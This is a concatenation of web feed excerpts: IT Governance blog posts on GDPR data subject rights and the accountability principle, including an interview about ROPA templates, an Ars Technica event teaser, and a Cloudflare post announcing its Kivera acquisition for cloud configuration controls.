&lt;p&gt;Related to that principle is the ‘right to rectification’. If exercised – meaning that a data subject alerts you to incorrect personal data on them – you (the &lt;a href="https://www.itgovernance.co.uk/blog/data-controller-vs-data-processor-whats-the-difference" rel="noreferrer noopener" target="_blank"&gt;data controller&lt;/a&gt;) must correct it.&lt;/p&gt;



&lt;p&gt;The right to rectification also means that if a data subject points out that, within the purposes of data processing, the data on them is incomplete, you must complete it.&lt;/p&gt;



&lt;p&gt;When someone exercises this right, you have one month to, if applicable, make the corrections and respond to the data subject.&lt;/p&gt;



&lt;center&gt;&lt;hr class="wp-block-separator" /&gt;&lt;/center&gt;



&lt;h2 class="wp-block-heading" id="The-right-to-erasure"&gt;4. The right to erasure (Article 17)&lt;/h2&gt;



&lt;p&gt;The &lt;a href="https://www.itgovernance.co.uk/blog/gdpr-article-17-what-is-the-right-to-erasure" rel="noreferrer noopener" target="_blank"&gt;right to erasure&lt;/a&gt; is also known as the ‘right to be forgotten’. It obliges you to erase someone’s data if they ask you to, where any of the following applies:&lt;/p&gt;



&lt;ul class="wp-block-list"&gt;
&lt;li&gt;The processing was unlawful to begin with.&lt;/li&gt;



&lt;li&gt;The data subject has withdrawn their consent.&lt;/li&gt;



&lt;li&gt;You need to destroy the data to comply with a legal obligation.&lt;/li&gt;



&lt;li&gt;You no longer need the personal data for the purpose(s) for which you collected it.&lt;/li&gt;



&lt;li&gt;You were collecting the data to offer information society services directly to a child.&lt;/li&gt;



&lt;li&gt;The data subject can legitimately object to the processing (see ‘the right to object’ below).&lt;/li&gt;
&lt;/ul&gt;



&lt;p&gt;This right isn’t absolute, and you don’t need to delete the data if you still need the data to comply with a legal obligation, for example, or need it for reasons of public interest or archiving purposes.&lt;/p&gt;



&lt;p&gt;If you receive a request to be forgotten, you must respond within one month – either having actioned the request, or to explain why you need to keep (some of) their data.&lt;/p&gt;



&lt;center&gt;&lt;hr class="wp-block-separator" /&gt;&lt;/center&gt;



&lt;h2 class="wp-block-heading" id="The-right-to-restrict-processing"&gt;5. The right to restrict processing (Article 18)&lt;/h2&gt;



&lt;p&gt;If a data subject exercises this right, you may store their data but not process it. (The restriction normally only applies for a limited time.)&lt;/p&gt;



&lt;p&gt;Someone may exercise this right because:&lt;/p&gt;



&lt;ul class="wp-block-list"&gt;
&lt;li&gt;They’re contesting the accuracy of the personal data;&lt;/li&gt;



&lt;li&gt;The processing is unlawful, but the subject doesn’t want their data destroyed;&lt;/li&gt;



&lt;li&gt;They’re challenging whether your legitimate grounds for processing override their interests; or&lt;/li&gt;



&lt;li&gt;You don’t need the personal data anymore, but the subject needs it to establish, exercise or defend a legal claim.&lt;/li&gt;
&lt;/ul&gt;



&lt;p&gt;Again, if exercised, you must respond within one month.&lt;/p&gt;



&lt;center&gt;&lt;hr class="wp-block-separator" /&gt;&lt;/center&gt;

&lt;/div&gt;



&lt;center&gt;&lt;hr class="wp-block-separator" /&gt;&lt;/center&gt;



&lt;h2 class="wp-block-heading" id="The-right-to-data-portability"&gt;6. The right to data portability (Article 20)&lt;/h2&gt;



&lt;p&gt;This right allows people to obtain their data from you in a “structured, commonly used and machine-readable format”, so they can easily reuse their data for other purposes.&lt;/p&gt;



&lt;p&gt;Someone will typically exercise this right when they’re changing providers – for their mobile phone contract, for example. That said, this right may be exercised in any circumstances where the data subject wants to have their personal data transferred to a different controller.&lt;/p&gt;



&lt;p&gt;Data subjects can only exercise this right if:&lt;/p&gt;



&lt;ul class="wp-block-list"&gt;
&lt;li&gt;They provided their data under the &lt;a href="https://www.itgovernance.co.uk/blog/gdpr-lawful-bases-for-processing-with-examples" rel="noreferrer noopener" target="_blank"&gt;lawful basis&lt;/a&gt; of consent; &lt;em&gt;and&lt;/em&gt;&lt;/li&gt;



&lt;li&gt;Where the processing is carried out by “automated means”.&lt;/li&gt;
&lt;/ul&gt;



&lt;p&gt;Put differently, they can only exercise it where the transfer is “technically feasible” (Article 20(2)).&lt;/p&gt;



&lt;center&gt;&lt;hr class="wp-block-separator" /&gt;&lt;/center&gt;



&lt;h2 class="wp-block-heading" id="The-right-to-object"&gt;7. The right to object (Article 21)&lt;/h2&gt;



&lt;p&gt;Article 21(1) of the GDPR says:&lt;/p&gt;



&lt;blockquote class="wp-block-quote is-layout-flow wp-block-quote-is-layout-flow"&gt;
&lt;p&gt;The data subject shall have the right to object, on grounds relating to his or her particular situation, at any time to processing of personal data concerning him or her which is based on points (e) or (f) of Article 6(1) [to perform a task in the public interest or for a legitimate interest], including profiling based on those provisions.&lt;/p&gt;



&lt;p&gt;The controller shall no longer process the personal data unless the controller demonstrates compelling legitimate grounds for the processing which override the interests, rights and freedoms of the data subject or for the establishment, exercise or defence of legal claims.&lt;/p&gt;
&lt;/blockquote&gt;



&lt;p&gt;Article 21(2) also specifies that data subjects can object to their data being used for &lt;a href="https://www.itgovernance.co.uk/green-papers/gdpr-and-pecr-a-guide-for-marketers" rel="noreferrer noopener" target="_blank"&gt;direct marketing&lt;/a&gt; purposes “at any time” – meaning that this is an absolute right.&lt;/p&gt;



&lt;p&gt;Where someone objects to a processing activity, and you can’t provide good grounds for overriding that objection, you must stop that processing (but you can keep the data if you’re using it for a different, lawful activity).&lt;/p&gt;



&lt;p&gt;Whether or not you comply with a data subject exercising their right to object, you must inform them of your decision within one month of receiving the objection.&lt;/p&gt;



&lt;center&gt;&lt;hr class="wp-block-separator" /&gt;&lt;/center&gt;



&lt;h2 class="wp-block-heading" id="Rights-related-to-automated-decision-making-including-profiling"&gt;8. Rights related to automated decision-making, including profiling (Article 22)&lt;/h2&gt;



&lt;p&gt;People have the right not to be subject to any &lt;a href="https://www.itgovernance.co.uk/blog/gdpr-automated-decision-making-and-profiling-what-are-the-requirements" rel="noreferrer noopener" target="_blank"&gt;automated decision-making&lt;/a&gt; with potentially legal or similarly significant consequences for them, unless:&lt;/p&gt;



&lt;ul class="wp-block-list"&gt;
&lt;li&gt;You need to conduct the processing to enter into a contract with the data subject;&lt;/li&gt;



&lt;li&gt;You’re required or authorised by law to conduct the processing; or&lt;/li&gt;



&lt;li&gt;The data subject has explicitly consented to the processing.&lt;/li&gt;
&lt;/ul&gt;



&lt;p&gt;Where you may proceed with the processing, you must:&lt;/p&gt;



&lt;ul class="wp-block-list"&gt;
&lt;li&gt;Inform the data subject about the processing;&lt;/li&gt;



&lt;li&gt;Enable them to easily request human intervention or challenge a decision; and&lt;/li&gt;



&lt;li&gt;Regularly review your systems to make sure they’re working as intended.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Continuing our partnership with IBM, Ars presents "AI in DC: Privacy, Compliance, and Making Infrastructure Smarter." Our tone this time around will be a little more policy-oriented than our San Jose event. We intend to have three panel discussions, with the overall topics looking like this:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;The key to compliance with emerging technologies&lt;/li&gt;
&lt;li&gt;Data security in the age of AI-assisted cyber-espionage&lt;/li&gt;
&lt;li&gt;The best infrastructure solution for your AI/ML strategy&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Specifically, here are our panels and the final set of panelists:&lt;/p&gt;&lt;p&gt;&lt;a href="https://arstechnica.com/information-technology/2024/10/join-ars-in-dc-for-infrastructure-cocktails-and-spycraft-on-october-29/"&gt;Read full article&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;The &lt;a href="https://www.itgovernance.co.uk/data-protection-dpa-and-eu-data-protection-regulation" rel="noreferrer noopener" target="_blank"&gt;GDPR (General Data Protection Regulation)&lt;/a&gt; outlines seven key principles relating to the processing of personal data.&lt;/p&gt;



&lt;p&gt;These are often referred to as ‘data protection principles’ or ‘data processing principles’.&lt;/p&gt;



&lt;p&gt;The principles are:&lt;/p&gt;



&lt;ol class="wp-block-list"&gt;
&lt;li&gt;Lawfulness, fairness and transparency&lt;/li&gt;



&lt;li&gt;Purpose limitation&lt;/li&gt;



&lt;li&gt;&lt;a href="https://www.itgovernance.co.uk/blog/what-is-data-minimisation-definition-examples" rel="noreferrer noopener" target="_blank"&gt;Data minimisation&lt;/a&gt;&lt;/li&gt;



&lt;li&gt;Accuracy&lt;/li&gt;



&lt;li&gt;Storage limitation&lt;/li&gt;



&lt;li&gt;&lt;a href="https://www.itgovernance.co.uk/blog/gdpr-article-32-your-guide-to-the-requirements" rel="noreferrer noopener" target="_blank"&gt;Integrity and confidentiality&lt;/a&gt;&lt;/li&gt;



&lt;li&gt;Accountability&lt;/li&gt;
&lt;/ol&gt;



&lt;p&gt;Among organisations that believe themselves GDPR compliant – and among those that don’t – accountability is often the weak link.&lt;/p&gt;



&lt;center&gt;&lt;hr class="wp-block-separator" /&gt;&lt;/center&gt;



&lt;h2 class="wp-block-heading"&gt;In this blog&lt;/h2&gt;



&lt;ul class="wp-block-list"&gt;
&lt;li&gt;&lt;a href="https://www.itgovernance.co.uk/blog/category/data-protection/feed#What-is-accountability"&gt;What is accountability?&lt;/a&gt;&lt;/li&gt;



&lt;li&gt;&lt;a href="https://www.itgovernance.co.uk/blog/category/data-protection/feed#Are-your-measures-effective"&gt;Are your measures effective?&lt;/a&gt;&lt;/li&gt;



&lt;li&gt;&lt;a href="https://www.itgovernance.co.uk/blog/category/data-protection/feed#Why-GDPR-accountability-is-important"&gt;Why GDPR accountability is important&lt;/a&gt;&lt;/li&gt;



&lt;li&gt;&lt;a href="https://www.itgovernance.co.uk/blog/category/data-protection/feed#Making-accountability-easy:-Q&amp;amp;A-with-Andrew-Snow"&gt;Making accountability easy: Q&amp;amp;A with Andrew Snow&lt;/a&gt;&lt;/li&gt;



&lt;li&gt;&lt;a href="https://www.itgovernance.co.uk/blog/category/data-protection/feed#ROPA-(record-of-processing-activities)-template"&gt;ROPA (record of processing activities) template&lt;/a&gt;&lt;/li&gt;



&lt;li&gt;&lt;a href="https://www.itgovernance.co.uk/blog/category/data-protection/feed#Automate-your-GDPR-compliance"&gt;Automate your GDPR compliance&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;



&lt;center&gt;&lt;hr class="wp-block-separator" /&gt;&lt;/center&gt;



&lt;h2 class="wp-block-heading" id="What-is-accountability"&gt;What does ‘accountability’ mean under the GDPR?&lt;/h2&gt;



&lt;p&gt;The GDPR says in Article 5(2) that &lt;a href="https://www.itgovernance.co.uk/blog/data-controller-vs-data-processor-whats-the-difference" rel="noreferrer noopener" target="_blank"&gt;data controllers&lt;/a&gt; must be able to demonstrate compliance with the other six principles. Though the GDPR doesn’t give a formal definition for ‘accountability’, its meaning is clear:&lt;/p&gt;



&lt;p&gt;&lt;strong&gt;You must be able to &lt;em&gt;prove&lt;/em&gt; compliance.&lt;/strong&gt;&lt;/p&gt;



&lt;p&gt;This isn’t &lt;em&gt;just&lt;/em&gt; a key GDPR requirement, subject to the higher-tier &lt;a href="https://www.itgovernance.co.uk/dpa-and-gdpr-penalties" rel="noreferrer noopener" target="_blank"&gt;fines&lt;/a&gt;.&lt;/p&gt;



&lt;p&gt;Meeting this principle ensures an overall approach to data security and privacy that’s effective at addressing your risks, as well as giving you a better return on investment on your measures.&lt;/p&gt;



&lt;p&gt;Accountability means being able to show your personal data processing activities are secure and GDPR compliant.&lt;/p&gt;



&lt;center&gt;&lt;hr class="wp-block-separator" /&gt;&lt;/center&gt;



&lt;h2 class="wp-block-heading" id="Are-your-measures-effective"&gt;Are your measures effective?&lt;/h2&gt;



&lt;p&gt;As evident from the many &lt;a href="https://www.itgovernance.co.uk/blog/free-expert-insights" rel="noreferrer noopener" target="_blank"&gt;conversations&lt;/a&gt; I have with subject-matter experts, organisations tend to implement measures and then forget about them.&lt;/p&gt;



&lt;p&gt;But you implement a control to &lt;a href="https://www.itgovernance.co.uk/blog/how-do-you-mitigate-information-security-risk" rel="noreferrer noopener" target="_blank"&gt;address a risk&lt;/a&gt; and bring it down to an acceptable level.&lt;/p&gt;



&lt;p&gt;You can’t, however, stop there.&lt;/p&gt;



&lt;p&gt;First, confirm that the &lt;strong&gt;control is effective&lt;/strong&gt;:&lt;/p&gt;



&lt;ul class="wp-block-list li-spaced"&gt;
&lt;li&gt;Did you implement it correctly, or does it require fine-tuning to get the result you want? Check that your money (and time) were well spent.&lt;/li&gt;



&lt;li&gt;Was the control the best risk treatment option you had? Don’t forget, as with many aspects in business, you make decisions based on your best guess only. There’s no shame in finding out you’re wrong, but that’s no excuse for &lt;em&gt;staying&lt;/em&gt; wrong.&lt;/li&gt;
&lt;/ul&gt;



&lt;p&gt;Second, &lt;strong&gt;risks aren’t static&lt;/strong&gt; – especially in a world where digital information is prevalent. Cyber threats and vulnerabilities are constantly changing, and risks change with them.&lt;/p&gt;



&lt;p&gt;Organisations change, too. Over time, you’ll modify the way you do things – bring in a new system, for example, or amend the way you conduct a certain activity. You may even go through a major change like a merger or an acquisition.&lt;/p&gt;



&lt;p&gt;In short, a measure that’s effective today may not be so effective a few months from now.&lt;/p&gt;



&lt;center&gt;&lt;hr class="wp-block-separator" /&gt;&lt;/center&gt;



&lt;h2 class="wp-block-heading" id="Why-GDPR-accountability-is-important"&gt;Why do we need accountability under the GDPR?&lt;/h2&gt;



&lt;p&gt;The above is why accountability under the GDPR is so important.&lt;/p&gt;



&lt;p&gt;It transforms GDPR compliance from a box-ticking exercise into a catalyst to improve the way you operate as a business. It means you’re:&lt;/p&gt;



&lt;ul class="wp-block-list li-spaced"&gt;
&lt;li&gt;Managing your risks better – not just to your data subjects (customers, employees, etc.), but also to your organisation;&lt;/li&gt;



&lt;li&gt;Keeping track of what data you’re collecting and why, and destroying data you’re not using or no longer need; and&lt;/li&gt;



&lt;li&gt;Making your processes more efficient and have more confidence in your data.&lt;/li&gt;
&lt;/ul&gt;







&lt;p&gt;It’s the difference between creating a &lt;a href="https://www.itgovernance.co.uk/blog/records-of-processing-activities-ropas-simplifying-gdpr-compliance" rel="noreferrer noopener" target="_blank"&gt;ROPA (record of processing activities)&lt;/a&gt; as a one-off exercise, and turning that ROPA into a type of asset register of true business value to your organisation.&lt;/p&gt;



&lt;p&gt;It’s the difference between just creating &lt;a href="https://www.itgovernance.co.uk/blog/the-documents-you-need-to-comply-with-the-gdpr" rel="noreferrer noopener" target="_blank"&gt;policies and procedures&lt;/a&gt;, and also generating records that’ll tell you that your processes are working and show a regulator – and other stakeholders – that you are, indeed, GDPR compliant.&lt;/p&gt;



&lt;p&gt;The accountability principle entails these types of differences.&lt;/p&gt;

&lt;h2 class="wp-block-heading" id="Making-accountability-easy:-Q&amp;amp;A-with-Andrew-Snow"&gt;How to be accountable under the GDPR&lt;/h2&gt;



&lt;p&gt;One approach is explore the ICO’s (Information Commissioner’s Office) &lt;a href="https://ico.org.uk/media/for-organisations/documents/2619653/accountability-tracker-202104.xlsm" rel="noreferrer noopener" target="_blank"&gt;accountability tracker&lt;/a&gt; and/or &lt;a href="https://ico.org.uk/for-organisations/uk-gdpr-guidance-and-resources/accountability-and-governance/accountability-framework/navigating-the-accountability-framework/" rel="noreferrer noopener" target="_blank"&gt;accountability framework&lt;/a&gt;. As the UK’s supervisory authority, this is a natural place to start for UK organisations.&lt;/p&gt;



&lt;p&gt;But is there a simpler way of showing accountability?&lt;/p&gt;



&lt;p&gt;I sat down with Andrew ‘Andy’ Snow, our &lt;a href="https://www.itgovernance.co.uk/gdpr-training" rel="noreferrer noopener" target="_blank"&gt;data privacy trainer&lt;/a&gt; and a &lt;a href="https://www.itgovernance.co.uk/data-protection-officer-dpo-under-the-gdpr" rel="noreferrer noopener" target="_blank"&gt;DPO (data protection officer)&lt;/a&gt;, to find out.&lt;/p&gt;



&lt;div class="wp-clock-spacer" style="height: 25px;"&gt;&lt;/div&gt;



&lt;p&gt;&lt;strong&gt;How would you approach GDPR accountability?&lt;/strong&gt;&lt;/p&gt;



&lt;p&gt;Well, accountability means that you need to be able to point at a [personal data] processing activity and say:&lt;/p&gt;



&lt;ul class="wp-block-list"&gt;
&lt;li&gt;The &lt;a href="https://www.itgovernance.co.uk/blog/gdpr-lawful-bases-for-processing-with-examples" rel="noreferrer noopener" target="_blank"&gt;lawful basis&lt;/a&gt; is [this].&lt;/li&gt;



&lt;li&gt;We’re ensuring purpose limitation like [this].&lt;/li&gt;



&lt;li&gt;We’re ensuring accuracy like [this].&lt;/li&gt;



&lt;li&gt;We’re securing data like [this].&lt;/li&gt;



&lt;li&gt;And so on.&lt;/li&gt;
&lt;/ul&gt;



&lt;p&gt;Having clear answers when questioned about anything related to the data protection principles is a good place to start. It shows you’ve thought about the principles and how you’re meeting them.&lt;/p&gt;



&lt;div class="wp-clock-spacer" style="height: 25px;"&gt;&lt;/div&gt;



&lt;p&gt;&lt;strong&gt;How can organisations address the data protection principles in a practical way?&lt;/strong&gt;&lt;/p&gt;



&lt;p&gt;I’d start with your &lt;a href="https://www.itgovernance.co.uk/blog/records-of-processing-activities-ropas-simplifying-gdpr-compliance" rel="noreferrer noopener" target="_blank"&gt;Article 30 ROPAs&lt;/a&gt;. We’ve previously talked about how you can make them your focal point of GDPR compliance by using them as a ‘one-stop shop’.&lt;/p&gt;



&lt;p&gt;&lt;em&gt;[You can read the full interview Andy is referring to &lt;/em&gt;&lt;a href="https://www.itgovernance.co.uk/blog/streamlining-gdpr-compliance-with-ropas-data-flow-maps-and-dpias" rel="noreferrer noopener" target="_blank"&gt;&lt;em&gt;here&lt;/em&gt;&lt;/a&gt;&lt;em&gt;.]&lt;/em&gt;&lt;/p&gt;



&lt;p&gt;This is precisely how I’ve approached my own ROPA template. I’ve tried to make it a more relevant document for organisations by putting all useful information in one place – not just what the GDPR lists in Article 30, but also cover:&lt;/p&gt;



&lt;ul class="wp-block-list"&gt;
&lt;li&gt;Accountability;&lt;/li&gt;



&lt;li&gt;How you’ll cater for data subject rights; and&lt;/li&gt;



&lt;li&gt;&lt;a href="https://www.itgovernance.co.uk/blog/gdpr-six-key-stages-of-the-data-protection-impact-assessment-dpia" rel="noreferrer noopener" target="_blank"&gt;DPIA&lt;/a&gt; [data protection impact assessment] information.&lt;/li&gt;
&lt;/ul&gt;



&lt;p&gt;I also use it for data flow information and as a risk register. Those aren’t explicit GDPR requirements, but having that information handy certainly helps you meet other legal and regulatory requirements and keep data secure.&lt;/p&gt;



&lt;div class="wp-clock-spacer" style="height: 25px;"&gt;&lt;/div&gt;



&lt;p&gt;&lt;strong&gt;How does using your ROPA like that help keep personal data secure?&lt;/strong&gt;&lt;/p&gt;



&lt;p&gt;Because, if you don’t know what data you have, where it’s going, or what risks are associated with it, how can you possibly protect it? For that matter, how can your business processes be maximally effective?&lt;/p&gt;



&lt;p&gt;But if you keep that information together – the kind you’d want to regularly use in day-to-day activities, not just document then forget about – accountability becomes part of business as usual without too much effort, once you’ve put together those ROPAs.&lt;/p&gt;



&lt;p&gt;This approach to ROPAs also provides a ‘single source of truth’. It’s like version control in an ISMS [information security management system, ideally aligned to &lt;a href="https://www.itgovernance.co.uk/iso27001" rel="noreferrer noopener" target="_blank"&gt;ISO 27001&lt;/a&gt;].&lt;/p&gt;



&lt;p&gt;If you scatter your documentation, and someone updates a document in one location but not in another, how will you establish which is correct? Will people even realise that there are two [or more] versions of that document?&lt;/p&gt;



&lt;p&gt;Whereas if everyone defaults to their ROPA to check the &lt;a href="https://www.itgovernance.co.uk/blog/top-tips-for-data-retention-under-the-gdpr" rel="noreferrer noopener" target="_blank"&gt;retention period&lt;/a&gt;, which also contains hyperlinks to the documented consent, DPIA, etc., that makes for a considerably more coherent approach.&lt;/p&gt;



&lt;div class="wp-clock-spacer" style="height: 25px;"&gt;&lt;/div&gt;



&lt;p&gt;&lt;strong&gt;Can you share your ROPA template with us?&lt;/strong&gt;&lt;/p&gt;



&lt;p&gt;Of course! Trainees regularly ask for a copy, which I’m happy to share – I hope it gives people a good starting point.&lt;/p&gt;



&lt;p&gt;&lt;em&gt;[We’ve recreated Andy’s template below.]&lt;/em&gt;&lt;/p&gt;



&lt;div class="wp-clock-spacer" style="height: 25px;"&gt;&lt;/div&gt;



&lt;p&gt;&lt;strong&gt;Thanks a lot, Andy. My final question: for those looking to further automate compliance, or who aren’t keen on spreadsheets, is &lt;/strong&gt;&lt;a href="https://www.itgovernance.co.uk/cybercomply" rel="noreferrer noopener" target="_blank"&gt;&lt;strong&gt;CyberComply&lt;/strong&gt;&lt;/a&gt;&lt;strong&gt; a good solution for demonstrating GDPR accountability?&lt;/strong&gt;&lt;/p&gt;



&lt;p&gt;It most certainly is, but it’ll take buy-in from management for it to work. Without that buy-in, no solution will work in the long run – accountability is something that needs to be baked into the organisation’s culture, which has to come from management.&lt;/p&gt;



&lt;p&gt;The organisation must be accountable for every processing activity. It must have due regard for all risks associated with its processing activities.&lt;/p&gt;



&lt;p&gt;So, if you &lt;em&gt;don’t&lt;/em&gt; have an Article 30 ROPA, and you’re &lt;em&gt;not&lt;/em&gt; tracking all these processing activities, how do you even &lt;em&gt;understand&lt;/em&gt; the risks from specific activities? [A specific responsibility of the &lt;a href="https://www.itgovernance.co.uk/blog/what-it-takes-to-be-your-organisations-dpo-or-data-privacy-lead" rel="noreferrer noopener" target="_blank"&gt;DPO or data privacy lead&lt;/a&gt;.]&lt;/p&gt;



&lt;p&gt;Accountability needs to be embedded into everything organisations do. Again, it’s having that one-stop shop.&lt;/p&gt;



&lt;center&gt;&lt;hr class="wp-block-separator" /&gt;&lt;/center&gt;



&lt;h2 class="wp-block-heading" id="ROPA-(record-of-processing-activities)-template"&gt;Free ROPA template&lt;/h2&gt;



&lt;p&gt;&lt;em&gt;Andy’s ROPA template doesn’t fit (legibly) into one screenshot. Instead, we’ve replicated his Excel-based template in segments, which you can easily tailor to suit your needs.&lt;/em&gt;&lt;/p&gt;

This acquisition extends our SASE portfolio to incorporate inline cloud app controls, empowering &lt;a href="https://www.cloudflare.com/zero-trust/"&gt;&lt;u&gt;Cloudflare One&lt;/u&gt;&lt;/a&gt; customers with preventative security controls for all their cloud services.&lt;/p&gt;&lt;p&gt;In today’s digital landscape, cloud services and SaaS (software as a service) apps have become indispensable for the daily operation of organizations. At the same time, the amount of data flowing between organizations and their cloud providers has ballooned, increasing the chances of data leakage, compliance issues, and worse, opportunities for attackers. Additionally, many companies — especially at enterprise scale — are working directly with multiple cloud providers for flexibility based on the strengths, resiliency against outages or errors, and cost efficiencies of different clouds. &lt;/p&gt;&lt;p&gt;Security teams that rely on &lt;a href="https://www.cloudflare.com/learning/cloud/what-is-cspm/"&gt;&lt;u&gt;Cloud Security Posture Management (CSPM)&lt;/u&gt;&lt;/a&gt; or similar tools for monitoring cloud configurations and permissions and Infrastructure as code (IaC) scanning are falling short due to detecting issues only after misconfigurations occur with an overwhelming volume of alerts. The combination of Kivera and Cloudflare One puts preventive controls directly into the deployment process, or ‘inline’, blocking errors before they happen. This offers a proactive approach essential to protecting cloud infrastructure from evolving cyber threats, maintaining data security, and accelerating compliance. &lt;/p&gt;
          &lt;div&gt;
            &lt;h2&gt;An early warning system for cloud security risks &lt;/h2&gt;
            &lt;a href="https://blog.cloudflare.com/tag/security/rss#an-early-warning-system-for-cloud-security-risks"&gt;
              
            &lt;/a&gt;
          &lt;/div&gt;
          &lt;p&gt;In a significant leap forward in cloud security, the combination of Kivera’s technology and Cloudflare One adds preventive, inline controls to enforce secure configurations for cloud resources. By inspecting cloud API traffic, these new capabilities equip organizations with enhanced visibility and granular controls, allowing for a proactive approach in mitigating risks, managing cloud security posture, and embracing a streamlined DevOps process when deploying cloud infrastructure.&lt;/p&gt;&lt;p&gt;Kivera will add the following capabilities to Cloudflare’s &lt;a href="https://www.cloudflare.com/learning/access-management/what-is-sase/"&gt;&lt;u&gt;SASE&lt;/u&gt;&lt;/a&gt; platform:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;p&gt;&lt;b&gt;One-click security:&lt;/b&gt; Customers benefit from immediate prevention of the most common cloud breaches caused by misconfigurations, such as accidentally allowing public access or policy inconsistencies.&lt;/p&gt;&lt;/li&gt;&lt;li&gt;&lt;p&gt;&lt;b&gt;Enforced cloud tenant control:&lt;/b&gt; Companies can easily draw boundaries around their cloud resources and tenants to ensure that sensitive data stays within their organization. &lt;/p&gt;&lt;/li&gt;&lt;li&gt;&lt;p&gt;&lt;b&gt;Prevent data exfiltration:&lt;/b&gt; Easily set rules to prevent data being sent to unauthorized locations.&lt;/p&gt;&lt;/li&gt;&lt;li&gt;&lt;p&gt;&lt;b&gt;Reduce ‘shadow’ cloud infrastructure:&lt;/b&gt; Ensure that every interaction between a customer and their cloud provider is in line with preset standards. &lt;/p&gt;&lt;/li&gt;&lt;li&gt;&lt;p&gt;&lt;b&gt;Streamline cloud security compliance:&lt;/b&gt; Customers can automatically assess and enforce compliance against the most common regulatory frameworks.&lt;/p&gt;&lt;/li&gt;&lt;li&gt;&lt;p&gt;&lt;b&gt;Flexible DevOps model:&lt;/b&gt; Enforce bespoke controls independent of public cloud setup and deployment tools, minimizing the layers of lock-in between an organization and a cloud provider.&lt;/p&gt;&lt;/li&gt;&lt;li&gt;&lt;p&gt;&lt;b&gt;Complementing other cloud security tools:&lt;/b&gt; Create a first line of defense for cloud deployment errors, reducing the volume of alerts for customers also using CSPM tools or Cloud Native Application Protection Platforms (CNAPPs). &lt;/p&gt;&lt;/li&gt;&lt;/ul&gt;
          &lt;figure&gt;
          &lt;img src="https://cf-assets.www.cloudflare.com/zkvhlag99gkb/7nALx5Qv8FBYxn1R6RkUvX/1b3dddb60d9d85142a9fda82d2eee381/BLOG-2592_2.png" /&gt;
          &lt;/figure&gt;&lt;p&gt;&lt;sub&gt;&lt;i&gt;An intelligent proxy that uses a policy-based approach to 
enforce secure configuration of cloud resources.&lt;/i&gt;&lt;/sub&gt;&lt;/p&gt;
          &lt;div&gt;
            &lt;h2&gt;Better together with Cloudflare One&lt;/h2&gt;
            &lt;a href="https://blog.cloudflare.com/tag/security/rss#better-together-with-cloudflare-one"&gt;
              
            &lt;/a&gt;
          &lt;/div&gt;
          &lt;p&gt;As a SASE platform, Cloudflare One ensures safe access and provides data controls for cloud and SaaS apps. This integration broadens the scope of Cloudflare’s SASE platform beyond user-facing applications to incorporate increased cloud security through proactive configuration management of infrastructure services, beyond what CSPM and &lt;a href="https://www.cloudflare.com/learning/access-management/what-is-a-casb/"&gt;&lt;u&gt;CASB&lt;/u&gt;&lt;/a&gt; solutions provide. With the addition of Kivera to Cloudflare One, customers now have a unified platform for all their inline protections, including cloud control, access management, and threat and data protection. All of these features are available with single-pass inspection, which is &lt;a href="https://blog.cloudflare.com/network-performance-update-cio-edition/?_ga=2.241337794.1947644748.1710771073-1224524116.1709647459"&gt;&lt;u&gt;50% faster&lt;/u&gt;&lt;/a&gt; than &lt;a href="https://www.cloudflare.com/learning/access-management/what-is-a-secure-web-gateway/"&gt;&lt;u&gt;Secure Web Gateway (SWG)&lt;/u&gt;&lt;/a&gt; alternatives.  &lt;/p&gt;&lt;p&gt;With the earlier &lt;a href="https://blog.cloudflare.com/cloudflare-acquires-bastionzero/"&gt;&lt;u&gt;acquisition of BastionZero&lt;/u&gt;&lt;/a&gt;, a Zero Trust infrastructure access company, Cloudflare One expanded the scope of its VPN replacement solution to cover infrastructure resources as easily as it does apps and networks. Together Kivera and BastionZero enable centralized security management across hybrid IT environments, and provide a modern DevOps-friendly way to help enterprises connect and protect their hybrid infrastructure with Zero Trust best practices.&lt;/p&gt;&lt;p&gt;Beyond its SASE capabilities, Cloudflare One is integral to &lt;a href="https://www.cloudflare.com/connectivity-cloud/"&gt;&lt;u&gt;Cloudflare’s connectivity cloud&lt;/u&gt;&lt;/a&gt;, enabling organizations to consolidate IT security tools on a single platform. This simplifies secure access to resources, from developer privileged access to technical infrastructure and expanding cloud services. As &lt;a href="https://www.cloudflare.com/lp/forrester-wave-sse-2024/"&gt;&lt;u&gt;Forrester echoes&lt;/u&gt;&lt;/a&gt;, “Cloudflare is a good choice for enterprise prospects seeking a high-performance, low-maintenance, DevOps-oriented solution.”&lt;/p&gt;
          &lt;div&gt;
            &lt;h2&gt;The growing threat of cloud misconfigurations&lt;/h2&gt;
            &lt;a href="https://blog.cloudflare.com/tag/security/rss#the-growing-threat-of-cloud-misconfigurations"&gt;
              
            &lt;/a&gt;
          &lt;/div&gt;
          &lt;p&gt;The cloud has become a prime target for cyberattacks. According to the &lt;a href="https://www.crowdstrike.com/resources/reports/crowdstrike-2023-cloud-risk-report-executive-summary/"&gt;&lt;u&gt;2023 Cloud Risk Report&lt;/u&gt;&lt;/a&gt;, CrowdStrike observed a 95% increase in cloud exploitation from 2021 to 2022, with a staggering 288% jump in cases involving threat actors directly targeting the cloud.&lt;/p&gt;&lt;p&gt;Misconfigurations in cloud infrastructure settings, such as improperly set security parameters and default access controls, provide adversaries with an easy path to infiltrate the cloud. According to the &lt;a href="https://cpl.thalesgroup.com/sites/default/files/content/cloud-security/2024/2024-thales-cloud-security-study-global-edition.pdf"&gt;&lt;u&gt;2023 Thales Global Cloud Security Study&lt;/u&gt;&lt;/a&gt;, which surveyed nearly 3,000 IT and security professionals from 18 countries, 44% of respondents reported experiencing a data breach, with misconfigurations and human error identified as the leading cause, accounting for 31% of the incidents.&lt;/p&gt;&lt;p&gt;Further, according to Gartner&lt;sup&gt;Ⓡ&lt;/sup&gt;, “Through 2027, 99% of records compromised in cloud environments will be the result of user misconfigurations and account compromise, not the result of an issue with the cloud provider.”&lt;sup&gt;1&lt;/sup&gt;&lt;/p&gt;&lt;p&gt;Several factors contribute to the rise of cloud misconfigurations:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;p&gt;&lt;b&gt;Rapid adoption of cloud services:&lt;/b&gt; Leaders are often driven by the scalability, cost-efficiency, and ability to support remote work and real-time collaboration that cloud services offer. These factors enable rapid adoption of cloud services which can lead to unintentional misconfigurations as IT teams struggle to keep up with the pace and complexity of these services. 